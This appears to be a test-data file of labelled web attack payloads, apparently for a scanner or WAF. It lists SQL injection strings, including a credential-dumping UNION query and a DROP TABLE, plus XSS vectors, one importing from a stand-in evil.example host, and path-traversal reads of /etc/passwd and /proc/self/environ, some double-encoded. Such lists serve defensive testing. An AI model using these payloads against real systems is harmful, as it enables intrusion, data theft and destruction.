# SQL injection (new)
SQLi|' OR 'x'='x
SQLi|admin' OR '1'='1'--
SQLi|1' ORDER BY 10--
SQLi|' UNION ALL SELECT username,password FROM users--
SQLi|1; DROP TABLE users
SQLi|1 AND 1=1
SQLi|1' AND (SELECT COUNT(*) FROM users)>0--
SQLi|' OR ''='
SQLi|' || (SELECT 1) || '
SQLi|1 UNION SELECT NULL
# XSS (new)
XSS|<details open ontoggle=alert(1)>
XSS|<svg/onload=alert(1)>
XSS|<video><source onerror=alert(1)>
XSS|<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
XSS|<style>@import 'http://evil.example/x.css';</style>
XSS|'-alert(1)-'
XSS|<scr<script>ipt>alert(1)</script>
# Path traversal (new)
PathTraversal|..%2f..%2f..%2fetc%2fpasswd
PathTraversal|/proc/self/environ
PathTraversal|C:\Windows\System32\drivers\etc\hosts
PathTraversal|..././..././etc/passwd
PathTraversal|file:///etc/passwd
# Encoding tricks (new)
DoubleEncoded|%252e%252e%252fetc%252fpasswd
DoubleEncoded|%2527%2520UNION%2520SELECT%25201,2--
